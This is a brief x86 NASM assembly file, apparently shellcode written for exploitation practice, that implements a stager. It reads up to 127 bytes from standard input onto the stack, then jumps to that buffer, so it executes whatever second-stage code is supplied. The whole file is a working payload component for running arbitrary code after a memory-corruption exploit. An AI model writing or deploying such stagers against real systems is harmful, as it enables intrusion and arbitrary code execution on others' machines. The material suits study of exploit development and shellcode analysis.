; stager.nasm
; Author:  Chase Hatch

section .text
global _start
_start:

	push 0x7f
	pop edx		; size 127
	push esp
	pop ecx
	xor ebx, ebx	; stdin (0)
	push byte 0x3	;
	pop eax		; read(fd, buf[], buf_len)
	int 0x80	;syscall
	push ecx	; address of ecx pushed onto stack
	ret		; Transfers program control to a return address located on the top of the stack.

